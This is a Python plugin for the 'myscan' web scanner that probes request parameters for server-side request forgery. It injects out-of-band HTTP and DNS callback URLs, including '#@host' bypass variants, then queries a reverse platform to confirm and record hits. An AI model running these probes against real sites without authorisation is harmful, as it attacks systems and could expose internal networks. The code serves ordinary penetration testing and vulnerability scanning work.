#!/usr/bin/env python3
# @Time    : 2020-03-19
# @Author  : caicai
# @File    : myscan_ssrf.py
''''
原理:参数值url解码后，包含http://或者https://则进行http，dns两种盲打，再从盲打平台查询
'''

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.const import notAcceptedExt, URL_ARGS
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse
from urllib import parse as urlparse
from myscan.lib.core.common import get_random_str
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "ssrf"
        self.vulmsg = "请求伪造，可探测内网，可攻击内网"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        self.parser = dictdata_parser(self.dictdata)
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        if params:
            for param in params:
                value = urlparse.unquote(param.get("value"))
                test = False
                if self.isneedtest(param) and not re.search("^http[s]?://", value):
                    test = True
                    value = "{protocol}://{host}".format(**self.dictdata.get("url"))
                if re.search("^http[s]?://", value) or test:
                    host = urlparse.urlparse(value).netloc.split(":")[0]
                    info = "ssrf_" + get_random_str(5)
                    payloads = []
                    for method in ["http", "dns"]:
                        url, hexdata = self.generatepayload(info, method)
                        payloads.append((url, hexdata))

                        for url_ in set([
                            url,
                            "{}#@{}".format(url, self.parser.url.get("host")),  # 利用#绕过
                            "{}#@{}".format(url, host),
                        ]):
                            req = self.parser.getreqfromparam(param, "w", url_)
                            r = request(**req)
                    self.querytosave(payloads, param)

    def generatepayload(self, info, type):
        cmds, hexdata = generate_reverse_payloads(info, type)
        if type == "http":
            url = cmds[0].split(" ", 1)[1]
        else:
            url = "http://" + cmds[0].split(" ")[-1]
        return url, hexdata

    def querytosave(self, payloads, param):
        payload, hexdata = payloads[0]

        res, res_data = query_reverse(hexdata)
        if res:
            self.save(param, payload)
            return
        for payload, hexdata in payloads[1:]:  # 后面的不睡眠等待
            res, res_data = query_reverse(hexdata, False)
            if res:
                self.save(param, payload)
                break

    def save(self, param, payload):
        self.result.append({
            "name": self.name,
            "url": self.dictdata.get("url").get("url").split("?")[0],
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "param": param.get("name"),
                "payload": payload,
                "vulmsg": self.vulmsg,
                "request": self.parser.getrequestraw(),
                "response": self.parser.getresponseraw()
            }
        })

    def isneedtest(self, param):
        name = param.get("name", "")
        if name != "":
            for key in URL_ARGS:
                if name.lower() in key.lower():
                    return True
